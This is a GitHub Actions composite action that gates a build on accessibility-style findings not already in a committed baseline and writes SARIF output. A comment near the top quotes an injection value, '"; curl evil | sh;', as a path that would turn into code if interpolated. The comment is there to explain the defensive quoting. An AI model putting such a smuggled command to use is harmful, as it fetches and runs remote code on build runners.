name: MR-Spark gate
description: Fail only on findings a committed baseline does not already have; write SARIF for code scanning.

# One action, one job: run the gate and fail the build. It deliberately does not upload the SARIF,
# install the CLI, or write a missing baseline — see docs/adr/0006-the-gate-action-audits-and-the-workflow-publishes.md.
#
# Every value crosses into the shell through `env:`, never through `${{ }}` inside `run:`. Action inputs
# are interpolated into a script before bash sees it, so a target path containing `"; curl evil | sh;`
# would become code. The quoting below is what makes that a filename instead.

inputs:
  target:
    # One argument, but the argument may be a directory or a space-separated list: the CLI does the
    # expanding, so `dist` here means the same set of pages as `dist` in `spark baseline dist` — which is
    # the only reason a whole-repo baseline stays readable. Split on whitespace; a path with a space in it
    # has to be gated by its directory instead. That is a real limit and it is written down rather than
    # worked around with a second quoting layer in bash.
    description: The page or pages to audit — a file, a directory (every page in it), a URL, or several separated by spaces.
    required: true
  baseline:
    description: The committed baseline file `spark baseline` wrote.
    default: .spark-baseline.json
  sarif:
    description: Where to write the SARIF report. Empty means do not write one.
    default: .spark/spark-gate.sarif
  strict:
    description: true also fails on findings from rules the baseline never listed.
    default: 'false'
  fail-under:
    description: Also require this conformance score, 0-100. Empty means do not check it.
    default: ''
  spark:
    description: The CLI command line to run, split on spaces. Override it for a local build.
    default: spark
  working-directory:
    description: Where to run, relative to the repository root.
    default: '.'

runs:
  using: composite
  steps:
    - name: Gate the pages on their baseline
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      env:
        SPARK: ${{ inputs.spark }}
        SPARK_TARGET: ${{ inputs.target }}
        SPARK_BASELINE: ${{ inputs.baseline }}
        SPARK_SARIF: ${{ inputs.sarif }}
        SPARK_STRICT: ${{ inputs.strict }}
        SPARK_FAIL_UNDER: ${{ inputs.fail-under }}
      run: |
        set -euo pipefail
        read -r -a cmd <<< "$SPARK"
        read -r -a targets <<< "$SPARK_TARGET"
        if [ "${#targets[@]}" -eq 0 ]; then
          echo "::error::spark-gate: target is empty. A gate that audits nothing reports a pass, which is the one output it must never produce."
          exit 2
        fi

        case "$SPARK_STRICT" in
          true) SPARK_STRICT=true ;;
          false|'') SPARK_STRICT=false ;;
          *)
            echo "::error::spark-gate: strict must be true or false; got '$SPARK_STRICT'. A flag that silently means nothing is worse than one that fails."
            exit 2
            ;;
        esac

        # ${arr[@]+"${arr[@]}"} is the empty-array-safe expansion: `set -u` under bash 4.3 treats
        # "${arr[@]}" as an unset variable, and a gate that dies on its own runner's bash version is a
        # gate people blame on the tool.
        extra=()
        if [ "$SPARK_STRICT" = true ]; then extra+=(--strict); fi
        if [ -n "$SPARK_FAIL_UNDER" ]; then extra+=(--fail-under "$SPARK_FAIL_UNDER"); fi

        # The verdict comes from this run — the human-shaped one, whose findings list belongs in the log.
        code=0
        "${cmd[@]}" check ${targets[@]+"${targets[@]}"} --ci --no-color --baseline "$SPARK_BASELINE" ${extra[@]+"${extra[@]}"} || code=$?

        if [ -n "$SPARK_SARIF" ]; then
          mkdir -p "$(dirname "$SPARK_SARIF")"
          # A second non-zero exit would add nothing to the verdict the line above already recorded, and
          # the payload is what a reviewer needs even when the build failed — that is the case where the
          # annotations matter most. Hence `|| true`.
          "${cmd[@]}" check ${targets[@]+"${targets[@]}"} --ci --no-color --baseline "$SPARK_BASELINE" \
            --format sarif --out "$SPARK_SARIF" ${extra[@]+"${extra[@]}"} >/dev/null || true

          # The step summary is rendered from the payload that was just produced, not from a second
          # opinion: one number, one source. `tee` keeps a copy beside it because `$GITHUB_STEP_SUMMARY` is
          # a *per-step* file — a later step cannot read back what this step wrote, so a workflow that wants
          # to assert or archive the summary needs a path in the workspace. And the whole thing is `|| true`:
          # a summary must never be the reason a build fails, since the verdict is already recorded.
          if [ -f "$SPARK_SARIF" ]; then
            summary="$(dirname "$SPARK_SARIF")/summary.md"
            node "$GITHUB_ACTION_PATH/summary.mjs" "$SPARK_SARIF" > "$summary" || true
            cat "$summary"
            if [ -n "${GITHUB_STEP_SUMMARY:-}" ]; then
              cat "$summary" >> "$GITHUB_STEP_SUMMARY" || true
            fi
          fi

          # Only when the payload exists: pointing at a file that was never written (no baseline, so the
          # run stopped before formatting anything) is a notice that sends someone to look for nothing.
          if [ -f "$SPARK_SARIF" ]; then
            echo "::notice::spark-gate: wrote $SPARK_SARIF. Upload it with github/codeql-action/upload-sarif@v3 (needs security-events: write) to put the new findings on the diff."
          fi
        fi

        exit "$code"
